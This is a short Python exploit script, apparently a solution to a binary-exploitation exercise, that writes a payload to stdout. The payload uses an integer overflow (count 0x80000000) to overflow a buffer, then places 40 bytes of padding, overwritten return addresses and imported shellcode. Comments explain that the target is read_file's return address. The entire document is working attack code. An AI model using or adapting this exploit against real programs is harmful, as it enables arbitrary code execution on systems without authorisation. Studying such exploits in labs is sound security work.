from struct import pack
from shellcode import shellcode
import sys
sys.stdout.buffer.write(pack("<I", 0x80000000) + bytes.fromhex('41'*40) + pack("<I", 0xfffeaa98) + pack("<I", 0xfffeaa80) + shellcode)
#0x80000000 is copied into count -- count * sizeof(unsignedint) == integer overflow
#needed to overflow read_file return address instead of read_element
# 	so needed to put shell after the return address -- previous stack dissapeared
